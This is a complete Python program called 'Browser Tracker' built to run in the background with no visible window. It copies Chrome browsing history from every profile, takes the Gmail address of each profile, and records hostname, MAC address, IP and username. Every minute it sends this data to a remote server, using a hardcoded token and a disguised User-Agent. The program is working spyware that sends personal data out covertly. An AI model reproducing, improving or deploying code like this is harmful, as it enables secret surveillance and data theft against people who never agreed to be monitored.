"""
Browser Tracker - Pure Background Mode
Runs completely invisible without GUI or system tray
"""

import os
import sys
import json
import time
import threading
import requests
import sqlite3
import shutil
import tempfile
from datetime import datetime, timezone
import socket
import getpass
import platform
from uuid import getnode
import hashlib

class BackgroundBrowserAgent:
    """Pure background browser tracking agent"""
    
    def __init__(self):
        self.running = False
        self.client_id = None
        self.monitor_thread = None
        
        # User data directory for storage
        self.user_data_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "BrowserTracker")
        os.makedirs(self.user_data_dir, exist_ok=True)
        
        # Configuration
        self.config = {
            "server_url": "https://browser-tracking.vercel.app",
            "api_token": "BrowserTracker2024SecureToken",
            "check_interval": 60,
            "batch_size": 50
        }
        
        # Data tracking
        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data.json')
        self.sent_data_hashes = self.load_sent_data()
        
        print(f"🤖 Background Browser Agent initialized")
        print(f"📁 Data directory: {self.user_data_dir}")
        print(f"🌐 Server: {self.config['server_url']}")
    
    def load_sent_data(self):
        """Load previously sent data hashes"""
        try:
            if os.path.exists(self.sent_data_file):
                with open(self.sent_data_file, 'r') as f:
                    data = json.load(f)
                    return set(data.get('hashes', []))
            return set()
        except Exception as e:
            print(f"❌ Error loading sent data: {e}")
            return set()
    
    def save_sent_data(self):
        """Save sent data hashes"""
        try:
            hashes_list = list(self.sent_data_hashes)[-1000:]  # Keep last 1000
            self.sent_data_hashes = set(hashes_list)
            
            data = {
                'hashes': hashes_list,
                'last_updated': datetime.now().isoformat()
            }
            with open(self.sent_data_file, 'w') as f:
                json.dump(data, f, indent=2)
            print(f"💾 Saved {len(hashes_list)} data hashes")
        except Exception as e:
            print(f"❌ Error saving sent data: {e}")
    
    def create_data_hash(self, entry):
        """Create unique hash for data entry"""
        hash_string = f"{entry['url']}|{entry['title']}|{entry['profile_name']}"
        return hashlib.md5(hash_string.encode()).hexdigest()
    
    def get_system_info(self):
        """Collect system information"""
        try:
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
        except Exception as e:
            print(f"❌ Error getting system info: {e}")
            return None
    
    def send_data(self, endpoint, data):
        """Send data to server"""
        try:
            headers = {
                'Authorization': f'Bearer {self.config["api_token"]}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            url = f'{self.config["server_url"]}/api/{endpoint}'
            
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=30
            )
            
            return response.status_code == 200, response
            
        except Exception as e:
            print(f"❌ Error sending data to {endpoint}: {e}")
            return False, None
    
    def register_client(self):
        """Register client with server"""
        try:
            print("🔗 Registering client...")
            system_info = self.get_system_info()
            if not system_info:
                return False
            
            success, response = self.send_data('register', system_info)
            if success and response:
                data = response.json()
                if data.get('success'):
                    self.client_id = data.get('client_id')
                    print(f"✅ Client registered with ID: {self.client_id}")
                    return True
            
            print("❌ Failed to register client")
            return False
            
        except Exception as e:
            print(f"❌ Error registering client: {e}")
            return False
    
    def get_chrome_history(self, limit=50):
        """Collect Chrome browsing history"""
        try:
            chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
            if not os.path.exists(chrome_base):
                print("⚠️ Chrome not found")
                return []
            
            all_history = []
            profiles_found = 0
            
            # Check Default profile and numbered profiles
            profiles_to_check = ['Default']
            try:
                for item in os.listdir(chrome_base):
                    if item.startswith('Profile '):
                        profiles_to_check.append(item)
            except:
                pass
            
            for profile_name in profiles_to_check:
                profile_path = os.path.join(chrome_base, profile_name)
                history_db = os.path.join(profile_path, 'History')
                
                if not os.path.exists(history_db):
                    continue
                
                try:
                    profiles_found += 1
                    
                    # Copy database to avoid locking issues
                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                        temp_db = temp_file.name
                    
                    shutil.copy2(history_db, temp_db)
                    
                    # Read history
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                        SELECT url, title, visit_count, last_visit_time
                        FROM urls
                        WHERE last_visit_time > 0
                        ORDER BY last_visit_time DESC
                        LIMIT ?
                    ''', (limit,))
                    
                    profile_entries = 0
                    for row in cursor.fetchall():
                        url, title, visit_count, chrome_time = row
                        
                        # Skip internal URLs
                        if self.should_skip_url(url):
                            continue
                        
                        # Convert Chrome timestamp
                        if chrome_time > 0:
                            unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                            visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                        else:
                            visit_time = datetime.now(tz=timezone.utc)
                        
                        # Get Gmail account for this profile
                        gmail_account = self.get_gmail_account(profile_path)
                        
                        entry = {
                            'url': url[:2000],
                            'title': (title or '')[:500],
                            'visit_time': visit_time.isoformat(),
                            'browser_type': 'Chrome',
                            'profile_name': profile_name,
                            'gmail_account': gmail_account
                        }
                        
                        # Check if this entry was already sent
                        entry_hash = self.create_data_hash(entry)
                        if entry_hash not in self.sent_data_hashes:
                            all_history.append(entry)
                            profile_entries += 1
                    
                    conn.close()
                    os.unlink(temp_db)
                    
                    if profile_entries > 0:
                        print(f"📁 {profile_name}: {profile_entries} fresh entries")
                    
                except Exception as e:
                    print(f"❌ Error reading {profile_name}: {e}")
                    continue
            
            if len(all_history) > 0:
                print(f"📊 Fresh data: {len(all_history)} new entries from {profiles_found} profiles")
                
                # Sort by timestamp (newest first)
                all_history.sort(key=lambda x: x['visit_time'], reverse=True)
                
                # Select batch
                batch_size = self.config.get('batch_size', 50)
                selected_entries = all_history[:batch_size]
                
                print(f"📦 Selected {len(selected_entries)} entries for transmission")
                return selected_entries
            else:
                print("ℹ️ No new data to send")
                return []
            
        except Exception as e:
            print(f"❌ Error getting Chrome history: {e}")
            return []
    
    def get_gmail_account(self, profile_path):
        """Extract Gmail account from Chrome profile"""
        try:
            prefs_file = os.path.join(profile_path, 'Preferences')
            if not os.path.exists(prefs_file):
                return None
            
            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)
            
            # Check account_info
            account_info = prefs.get('account_info', [])
            for account in account_info:
                email = account.get('email', '')
                if '@gmail.com' in email.lower():
                    return email
            
            # Check signin info
            signin = prefs.get('signin', {})
            allowed_usernames = signin.get('allowed_usernames', [])
            for username in allowed_usernames:
                if '@gmail.com' in username.lower():
                    return username
            
            return None
        except:
            return None
    
    def should_skip_url(self, url):
        """Check if URL should be skipped"""
        skip_patterns = [
            'chrome://', 'chrome-extension://', 'edge://', 'about:',
            'file://', 'localhost', '127.0.0.1', '192.168.', '10.0.', '172.16.'
        ]
        
        url_lower = url.lower()
        return any(pattern in url_lower for pattern in skip_patterns)
    
    def collect_and_send_data(self):
        """Main data collection and transmission"""
        try:
            print(f"🔄 Collecting data... ({datetime.now().strftime('%H:%M:%S')})")
            
            # Ensure client is registered
            if not self.client_id:
                if not self.register_client():
                    return False
            
            # Collect browsing history (only fresh data)
            history = self.get_chrome_history(50)
            if not history:
                return True
            
            # Send browsing data
            print(f"📤 Sending {len(history)} fresh entries...")
            success, response = self.send_data('browsing-data', {
                'client_id': self.client_id,
                'browsing_data': history
            })
            
            if success:
                # Mark data as sent
                for entry in history:
                    entry_hash = self.create_data_hash(entry)
                    self.sent_data_hashes.add(entry_hash)
                
                # Save sent data hashes
                self.save_sent_data()
                
                print(f"✅ {len(history)} fresh entries sent successfully")
                return True
            else:
                print(f"❌ Failed to send data")
                return False
            
        except Exception as e:
            print(f"❌ Error in collect_and_send_data: {e}")
            return False
    
    def start_monitoring(self):
        """Start monitoring in background"""
        if self.running:
            print("⚠️ Monitoring already running")
            return False
        
        print("🚀 Starting background monitoring...")
        self.running = True
        
        while self.running:
            try:
                # Collect and send data
                self.collect_and_send_data()
                
                # Wait for next collection
                interval = self.config.get('check_interval', 60)
                print(f"⏳ Next collection in {interval} seconds...")
                
                for _ in range(interval):
                    if not self.running:
                        break
                    time.sleep(1)
                    
            except Exception as e:
                print(f"❌ Error in monitoring loop: {e}")
                time.sleep(60)
        
        print("🛑 Background monitoring stopped")

def main():
    """Main function for background mode"""
    print("🔄 Starting Browser Tracker in Background Mode...")
    print("📍 No GUI, No System Tray, Pure Background")
    print("🛑 To stop: Use Task Manager > End python.exe")
    print("="*50)
    
    agent = BackgroundBrowserAgent()
    
    try:
        agent.start_monitoring()
    except KeyboardInterrupt:
        print("\n🛑 Stopping background agent...")
        agent.running = False

if __name__ == "__main__":
    main()
